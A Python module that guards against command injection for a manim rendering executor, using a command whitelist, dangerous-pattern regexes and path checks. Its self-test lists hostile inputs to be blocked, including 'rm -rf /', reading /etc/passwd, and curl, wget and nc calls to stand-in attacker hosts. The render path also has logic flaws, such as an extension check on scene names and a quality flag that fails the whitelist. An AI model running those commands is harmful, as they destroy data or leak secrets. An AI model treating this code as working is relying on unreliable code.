#!/usr/bin/env python3
"""
Subprocess Input Sanitization Module
Provides secure command execution with comprehensive input validation
"""

import logging
import os
import re
import shlex
import subprocess
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Union


class CommandInjectionError(Exception):
    """Raised when command injection attempt is detected"""

    pass


class SubprocessTimeoutError(Exception):
    """Raised when subprocess execution times out"""

    pass


class AllowedCommand(Enum):
    """Whitelist of allowed commands"""

    MANIM = "manim"
    FFMPEG = "ffmpeg"
    FFPROBE = "ffprobe"
    PYTHON = "python3"
    GIT = "git"


class CommandSanitizer:
    """
    Sanitizes and validates subprocess inputs to prevent command injection
    """

    # Dangerous characters that could lead to command injection
    DANGEROUS_CHARS = set(";|&$`<>(){}[]!\\")

    # Dangerous patterns that could indicate injection attempts
    DANGEROUS_PATTERNS = [
        r"\$\(",  # Command substitution $(...)
        r"`",  # Backtick command substitution
        r"&&",  # Command chaining
        r"\|\|",  # Command chaining
        r";",  # Command separator
        r"\|",  # Pipe
        r">>?",  # Redirection
        r"<",  # Input redirection
        r"\*",  # Glob expansion (in some contexts)
        r"\?",  # Glob expansion
        r"~",  # Home directory expansion
        r"\.\.",  # Directory traversal
        r"\\x[0-9a-fA-F]{2}",  # Hex escape sequences
        r"\\[0-7]{3}",  # Octal escape sequences
    ]

    # Whitelist of allowed file extensions for various operations
    ALLOWED_EXTENSIONS = {
        "video": [".mp4", ".avi", ".mov", ".webm", ".mkv", ".flv"],
        "python": [".py"],
        "data": [".json", ".yaml", ".yml", ".csv", ".txt"],
        "image": [".png", ".jpg", ".jpeg", ".gif", ".svg"],
    }

    # Maximum lengths for various inputs
    MAX_FILENAME_LENGTH = 255
    MAX_PATH_LENGTH = 4096
    MAX_ARG_LENGTH = 1024

    def __init__(self, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger(__name__)
        self.allowed_commands = set(cmd.value for cmd in AllowedCommand)

    def sanitize_filename(self, filename: str, file_type: str = "video") -> str:
        """
        Sanitize a filename to prevent injection attacks

        Args:
            filename: The filename to sanitize
            file_type: Type of file to validate against extension whitelist

        Returns:
            Sanitized filename

        Raises:
            CommandInjectionError: If dangerous patterns detected
        """
        if not filename:
            raise CommandInjectionError("Empty filename provided")

        # Check length
        if len(filename) > self.MAX_FILENAME_LENGTH:
            raise CommandInjectionError(
                f"Filename too long: {len(filename)} > {self.MAX_FILENAME_LENGTH}"
            )

        # Check for null bytes
        if "\x00" in filename:
            raise CommandInjectionError("Null byte in filename")

        # Validate extension
        ext = Path(filename).suffix.lower()
        if file_type in self.ALLOWED_EXTENSIONS:
            if ext not in self.ALLOWED_EXTENSIONS[file_type]:
                raise CommandInjectionError(
                    f"Invalid file extension '{ext}' for type '{file_type}'"
                )

        # Check for dangerous patterns
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, filename):
                self.logger.warning(
                    f"Dangerous pattern '{pattern}' detected in filename: {filename}"
                )
                raise CommandInjectionError("Dangerous pattern detected in filename")

        # Remove any remaining dangerous characters
        sanitized = "".join(c for c in filename if c not in self.DANGEROUS_CHARS)

        # Ensure the filename still has a valid structure
        if not sanitized or sanitized == "." or sanitized == "..":
            raise CommandInjectionError("Invalid filename after sanitization")

        return sanitized

    def sanitize_path(self, path: Union[str, Path], base_dir: Optional[Path] = None) -> Path:
        """
        Sanitize a file path to prevent directory traversal

        Args:
            path: The path to sanitize
            base_dir: Optional base directory to ensure path is within

        Returns:
            Sanitized Path object

        Raises:
            CommandInjectionError: If path traversal detected
        """
        path_str = str(path)

        # Check length
        if len(path_str) > self.MAX_PATH_LENGTH:
            raise CommandInjectionError(f"Path too long: {len(path_str)} > {self.MAX_PATH_LENGTH}")

        # Check for null bytes
        if "\x00" in path_str:
            raise CommandInjectionError("Null byte in path")

        # Resolve to absolute path
        try:
            resolved = Path(path_str).resolve()
        except (ValueError, OSError) as e:
            raise CommandInjectionError(f"Invalid path: {e}")

        # Check if within base directory if provided
        if base_dir:
            base_resolved = Path(base_dir).resolve()
            try:
                resolved.relative_to(base_resolved)
            except ValueError:
                raise CommandInjectionError(
                    f"Path '{resolved}' is outside base directory '{base_resolved}'"
                )

        # Check for suspicious patterns even in resolved path
        str_resolved = str(resolved)
        if "../" in str_resolved or "..\\" in str_resolved:
            raise CommandInjectionError("Directory traversal pattern detected in resolved path")

        return resolved

    def validate_manim_args(self, args: List[str]) -> List[str]:
        """
        Validate arguments for manim command

        Args:
            args: List of arguments to validate

        Returns:
            Validated arguments

        Raises:
            CommandInjectionError: If dangerous arguments detected
        """
        # Whitelist of allowed manim flags
        ALLOWED_FLAGS = {
            "-q",
            "--quality",
            "-p",
            "--preview",
            "-f",
            "--format",
            "-r",
            "--resolution",
            "-c",
            "--color",
            "-o",
            "--output",
            "-s",
            "--save_sections",
            "-a",
            "--write_all",
            "-t",
            "--transparent",
            "--fps",
            "--frame_rate",
            "--media_dir",
            "--log_level",
            "--disable_caching",
            "--flush_cache",
            "--progress_bar",
        }

        # Validate quality settings
        ALLOWED_QUALITIES = [
            "480p15",
            "480p30",
            "720p30",
            "720p60",
            "1080p30",
            "1080p60",
            "2160p60",
        ]

        validated_args = []
        i = 0
        while i < len(args):
            arg = args[i]

            # Check for dangerous characters in argument
            if any(char in arg for char in self.DANGEROUS_CHARS):
                raise CommandInjectionError(f"Dangerous character in argument: {arg}")

            # If it's a flag, validate it
            if arg.startswith("-"):
                # Extract the flag part (before any '=')
                flag = arg.split("=")[0]
                if flag not in ALLOWED_FLAGS:
                    raise CommandInjectionError(f"Disallowed flag: {flag}")

                # Handle quality flag specially
                if flag in ["-q", "--quality"]:
                    if "=" in arg:
                        quality = arg.split("=")[1]
                    elif i + 1 < len(args):
                        i += 1
                        quality = args[i]
                    else:
                        raise CommandInjectionError("Quality flag without value")

                    if quality not in ALLOWED_QUALITIES:
                        raise CommandInjectionError(f"Invalid quality setting: {quality}")

                    validated_args.append(flag)
                    validated_args.append(quality)
                else:
                    validated_args.append(arg)
            else:
                # It's a value, sanitize it
                if len(arg) > self.MAX_ARG_LENGTH:
                    raise CommandInjectionError(
                        f"Argument too long: {len(arg)} > {self.MAX_ARG_LENGTH}"
                    )
                validated_args.append(arg)

            i += 1

        return validated_args

    def build_safe_command(
        self, command: str, args: List[str], env: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        Build a safe subprocess command configuration

        Args:
            command: The command to execute
            args: Arguments for the command
            env: Optional environment variables

        Returns:
            Dictionary with subprocess configuration

        Raises:
            CommandInjectionError: If command not whitelisted or args invalid
        """
        # Validate command is whitelisted
        if command not in self.allowed_commands:
            raise CommandInjectionError(f"Command '{command}' not in whitelist")

        # Validate all arguments
        safe_args = []
        for arg in args:
            if isinstance(arg, Path):
                arg = str(arg)

            # Check for dangerous patterns
            for pattern in self.DANGEROUS_PATTERNS:
                if re.search(pattern, str(arg)):
                    raise CommandInjectionError(f"Dangerous pattern in argument: {arg}")

            safe_args.append(str(arg))

        # Build command list (never use shell=True)
        cmd_list = [command] + safe_args

        # Validate environment variables if provided
        safe_env = None
        if env:
            safe_env = os.environ.copy()
            for key, value in env.items():
                # Sanitize environment variable names and values
                if not re.match(r"^[A-Z_][A-Z0-9_]*$", key):
                    raise CommandInjectionError(f"Invalid environment variable name: {key}")
                if any(char in value for char in self.DANGEROUS_CHARS):
                    raise CommandInjectionError(
                        f"Dangerous character in environment value: {value}"
                    )
                safe_env[key] = value

        return {
            "args": cmd_list,
            "shell": False,  # NEVER use shell=True
            "env": safe_env,
            "capture_output": True,
            "text": True,
            "timeout": 300,  # Default 5 minute timeout
        }

    def execute_safe_command(
        self,
        command: str,
        args: List[str],
        cwd: Optional[Path] = None,
        timeout: int = 300,
    ) -> subprocess.CompletedProcess:
        """
        Execute a command safely with all protections

        Args:
            command: The command to execute
            args: Arguments for the command
            cwd: Working directory for command
            timeout: Timeout in seconds

        Returns:
            CompletedProcess object with results

        Raises:
            CommandInjectionError: If command validation fails
            SubprocessTimeoutError: If command times out
        """
        # Build safe command configuration
        cmd_config = self.build_safe_command(command, args)
        cmd_config["timeout"] = timeout

        if cwd:
            cmd_config["cwd"] = str(self.sanitize_path(cwd))

        try:
            # Log the command being executed (safely)
            safe_cmd_str = " ".join(shlex.quote(arg) for arg in cmd_config["args"])
            self.logger.info(f"Executing command: {safe_cmd_str}")

            # Execute with all protections
            result = subprocess.run(**cmd_config)

            if result.returncode != 0:
                self.logger.warning(
                    f"Command failed with code {result.returncode}: {result.stderr}"
                )

            return result

        except subprocess.TimeoutExpired as e:
            self.logger.error(f"Command timed out after {timeout} seconds")
            raise SubprocessTimeoutError(f"Command timed out: {e}")
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            raise


class SecureManimExecutor:
    """
    Secure executor for Manim commands with full input validation
    """

    def __init__(
        self,
        working_dir: Path,
        output_dir: Path,
        logger: Optional[logging.Logger] = None,
    ):
        self.working_dir = Path(working_dir).resolve()
        self.output_dir = Path(output_dir).resolve()
        self.logger = logger or logging.getLogger(__name__)
        self.sanitizer = CommandSanitizer(logger)

    def render_scene(
        self,
        script_path: Union[str, Path],
        scene_name: str,
        quality: str = "480p15",
        preview: bool = False,
    ) -> Path:
        """
        Securely render a Manim scene

        Args:
            script_path: Path to the Manim script
            scene_name: Name of the scene to render
            quality: Quality setting for render
            preview: Whether to preview after rendering

        Returns:
            Path to the rendered video

        Raises:
            CommandInjectionError: If inputs fail validation
            SubprocessTimeoutError: If rendering times out
        """
        # Sanitize all inputs
        safe_script = self.sanitizer.sanitize_path(script_path, self.working_dir)
        safe_scene = self.sanitizer.sanitize_filename(scene_name, "python")

        # Remove any non-alphanumeric characters from scene name (extra safety)
        safe_scene = re.sub(r"[^a-zA-Z0-9_]", "", scene_name)
        if not safe_scene:
            raise CommandInjectionError("Invalid scene name after sanitization")

        # Build arguments
        args = [
            "render",
            str(safe_script),
            safe_scene,
            f"-q{quality}",
            "--media_dir",
            str(self.output_dir),
        ]

        if preview:
            args.append("-p")

        # Validate arguments
        validated_args = self.sanitizer.validate_manim_args(args)

        # Execute safely
        result = self.sanitizer.execute_safe_command(
            "manim",
            validated_args,
            cwd=self.working_dir,
            timeout=600,  # 10 minutes for rendering
        )

        if result.returncode != 0:
            raise subprocess.CalledProcessError(
                result.returncode, result.args, result.stdout, result.stderr
            )

        # Parse output to find video path
        output_pattern = r'File ready at [\'"](.+?)[\'"]'
        match = re.search(output_pattern, result.stdout)
        if match:
            video_path = Path(match.group(1))
            # Validate the output path is within our output directory
            self.sanitizer.sanitize_path(video_path, self.output_dir)
            return video_path

        raise ValueError("Could not determine output video path from Manim output")


# Example usage and testing
if __name__ == "__main__":

    # Set up logging
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)

    # Create sanitizer
    sanitizer = CommandSanitizer(logger)

    # Test dangerous inputs that should be blocked
    dangerous_inputs = [
        "video.mp4; rm -rf /",
        "scene && cat /etc/passwd",
        "$(curl evil.com)",
        "`wget malware.com`",
        "../../../etc/passwd",
        "file|nc attacker.com 1234",
        "'; DROP TABLE users; --",
    ]

    print("Testing dangerous input detection:")
    for dangerous in dangerous_inputs:
        try:
            sanitizer.sanitize_filename(dangerous)
            print(f"  ❌ FAILED to block: {dangerous}")
        except CommandInjectionError:
            print(f"  ✅ Successfully blocked: {dangerous}")

    # Test safe inputs that should pass
    safe_inputs = [
        "my_video.mp4",
        "Scene_Name_123",
        "output_file.json",
    ]

    print("\nTesting safe input validation:")
    for safe in safe_inputs:
        try:
            result = sanitizer.sanitize_filename(safe, "video" if safe.endswith(".mp4") else "data")
            print(f"  ✅ Validated: {safe} -> {result}")
        except CommandInjectionError as e:
            print(f"  ❌ Incorrectly blocked: {safe} ({e})")

    print("\nSubprocess sanitization module loaded successfully!")
